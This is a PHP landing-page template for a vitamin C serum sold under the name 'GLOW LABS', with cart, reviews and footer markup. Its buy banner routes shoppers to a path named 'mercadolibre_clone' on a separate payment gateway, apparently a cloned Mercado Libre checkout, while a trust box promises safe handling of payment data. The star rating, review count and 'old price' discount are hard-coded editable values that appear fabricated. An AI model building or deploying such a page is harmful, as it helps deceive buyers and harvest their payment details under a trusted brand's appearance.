...
$landing_slug  = 'serum-vitamina-c-glow';
$landing_token = obtenerOCrearTokenLanding($landing_slug, "Sérum Facial Vitamina C Pura 15% + Ácido Hialurónico Anti-Manchas & Glow", 45000);
$precio_num    = 45000;
$precio_fmt    = '45.000';
...
<head>
    ...
    <title><?= htmlspecialchars("Sérum Facial Vitamina C Pura 15% + Ácido Hialurónico Anti-Manchas & Glow") ?></title>
...
<body class="<?= $es_modo_edicion ? 'modo-edicion-activo' : '' ?>" style="<?= $es_modo_edicion ? 'margin-top: 50px;' : '' ?>">
    ...
    <main class="landing-container">
        <div class="product-grid-layout">
            ...
            <section class="product-info">
                <h1 class="product-title" data-editable="true"><?= htmlspecialchars("Sérum Facial Vitamina C Pura 15% + Ácido Hialurónico Anti-Manchas & Glow") ?></h1>

                <div class="rating-row">
                    <div class="stars-container">★★★★★</div>
                    <span class="reviews-count" data-editable="true">(78)</span>
                </div>

                <div class="price-row">
                    <span class="current-price" data-editable="true">$ 45.000</span>
                    <span class="old-price" data-editable="true">$ 78.000</span>
                    <span class="discount-pill" data-editable="true">-42% OFF</span>
                </div>

                <div class="variant-block">
                    <div class="variant-header">
                        <div class="variant-label">Color / Variante: <span id="colorNameDisplay" data-editable="true"><?= htmlspecialchars("Fórmula Concentrada") ?></span></div>
                    </div>
                ...
                <div class="size-block">
                    ...
                    <div class="size-pills-row">
                        <button class="size-pill" data-editable="true"><?= htmlspecialchars("30ml / 1.0 fl.oz") ?></button>
                    </div>
                </div>
                ...
                <div class="accordion-item">
                    ...
                    <div class="accordion-body open">
                        <p data-editable="true">Tratamiento iluminador intensivo con 15% de vitamina C pura estabilizada, ácido ferúlico y ácido hialurónico. Atenúa manchas oscuras, unifica el tono de la piel y aporta una luminosidad radiante.</p>
                    </div>
                </div>
                ...
                <div class="secure-trust-box">
                    ...
                    <ul class="secure-trust-list">
                        ...
                        <li><span class="check-icon">✓</span> <span data-editable="true"><?= htmlspecialchars("GLOW LABS") ?> comparte información de pago únicamente con proveedores de pago confiables comprometidos con proteger tus datos.</span></li>
                    </ul>
                </div>
            </section>
    ...
    <div class="ml-promo-banner-wrap" onclick="window.location.href='<?= URL_PASARELA ?>/pago/mercadolibre_clone/index.php?token=<?= $landing_token ?>'">
        <div class="ml-banner-inner">
            ...
            <div class="ml-banner-center">
                <span class="ml-brand-name"><?= htmlspecialchars("GLOW LABS") ?></span>
                <span class="ml-product-name"><?= htmlspecialchars("Sérum Facial Vitamina C Pura 15% + Ácido Hialurónico Anti-Manchas & Glow") ?></span>
            ...
            <div class="filters-left-group">
                ...
                <div class="review-filter-pill">
                    ...
                    <select class="filter-select-box" id="filterColor" onchange="renderReviews()">
                        <option value="All">All</option>
                        <option value="<?= htmlspecialchars("Fórmula Concentrada") ?>"><?= htmlspecialchars("Fórmula Concentrada") ?></option>
                    </select>
                </div>
                <div class="review-filter-pill">
                    <span>Rating</span>
    ...
    <footer class="generic-footer">
        ...
        <div class="footer-bottom-generic">
            <div>© <?= date('Y') ?> <span data-editable="true"><?= htmlspecialchars("GLOW LABS") ?></span>. Todos los derechos reservados.</div>
    ...
    <div class="cart-overlay" id="cartOverlay" onclick="if(event.target===this) toggleCart()">
        <div class="cart-drawer">
            ...
            <div class="cart-footer">
                <div class="cart-summary-row"><span>Subtotal</span><span id="cartSubtotal">$ 45.000</span></div>
                <div class="cart-summary-row"><span>Envío</span><span style="color:#059669; font-weight:700;">GRATIS</span></div>
                <div class="cart-summary-row total"><span>Total</span><span id="cartTotal">$ 45.000</span></div>
    ...
    <script>
        ...
        const PRODUCTO_TITULO = "Sérum Facial Vitamina C Pura 15% + Ácido Hialurónico Anti-Manchas & Glow";
        const LANDING_TOKEN = "0555071589b7610d90deb913a5cd33df";
        const LANDING_SLUG = "serum-vitamina-c-glow";
        ...
        let cartState = { qty: 1, variant: "Fórmula Concentrada", size: "30ml / 1.0 fl.oz" };
